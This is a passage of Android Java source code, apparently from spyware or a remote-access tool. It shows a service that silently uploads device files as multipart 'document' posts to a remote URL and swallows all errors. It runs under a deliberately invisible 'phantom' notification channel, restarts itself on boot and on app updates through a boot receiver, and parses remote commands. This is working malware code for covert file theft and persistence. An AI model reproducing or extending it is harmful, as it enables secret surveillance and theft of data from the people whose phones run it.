            out.writeBytes("--" + bound + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[16384]; int n;
            while ((n = fis.read(buf)) != -1) out.write(buf, 0, n);
            fis.close();
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();
            drain(c.getResponseCode() == 200 ? c.getInputStream() : c.getErrorStream());
            c.disconnect();
        } catch (Exception ignored) {}
    }

    // ── Foreground Notification ───────────────────

    private void silentForeground() {
        String ch = "phantom_ch";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null && nm.getNotificationChannel(ch) == null) {
                NotificationChannel nc = new NotificationChannel(ch, "P", NotificationManager.IMPORTANCE_MIN);
                nc.setSound(null, null); nc.enableLights(false); nc.enableVibration(false); nc.setShowBadge(false);
                nm.createNotificationChannel(nc);
            }
        }
        Notification.Builder b = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        //noinspection deprecation
        b.setPriority(Notification.PRIORITY_MIN);
        startForeground(888, b.build());
    }

    // ── Boot Receiver ────────────────────────────

    public static class BootReceiver extends BroadcastReceiver {
        @Override public void onReceive(Context ctx, Intent intent) {
            String a = intent.getAction();
            if (Intent.ACTION_BOOT_COMPLETED.equals(a) || Intent.ACTION_MY_PACKAGE_REPLACED.equals(a))
                try { ctx.startService(new Intent(ctx, inq.class)); } catch (Exception ignored) {}
        }
    }

    // ── Helpers ──────────────────────────────────

    private HttpURLConnection open(String url, int conn, int read) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(conn); c.setReadTimeout(read);
        c.setRequestProperty("Connection", "close");
        return c;
    }

    private String drain(InputStream is) {
        if (is == null) return "";
        try {
            StringBuilder sb = new StringBuilder();
            BufferedReader br = new BufferedReader(new InputStreamReader(is));
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            return sb.toString();
        } catch (Exception e) { return ""; }
    }

    private int parseArg(String cmd, int def) {
        try { String[] p = cmd.trim().split("\\s+"); if (p.length > 1) return Integer.parseInt(p[1]); }
        catch (NumberFormatException ignored) {}
        return def;
    }

    private String nullSafe(String s) { return s != null ? s : ""; }

    private void write(FileOutputStream fos, String s) throws IOException {
        fos.write(s.getBytes(StandardCharsets.UTF_8));
    }
}
